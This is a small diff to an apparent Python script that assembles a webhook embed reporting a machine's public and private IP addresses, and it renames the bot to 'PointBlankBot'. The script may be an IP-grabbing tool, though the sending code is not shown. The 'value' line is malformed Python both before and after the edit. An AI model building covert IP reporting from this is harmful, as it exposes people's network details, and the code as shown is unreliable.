@@ -18,7 +18,7 @@ embed = {
     "fields": [
         {
             "name": "IP Adresses",
-            "value": public_ip, private_ip
+            "value": public_ip, private_ip,
             "inline": False
         },
         {
@@ -34,7 +34,7 @@ embed = {
 }
 
 payload = {
-    "username": "Webhook Bot",
+    "username": "PointBlankBot",
     "embeds": [
         embed
     ]
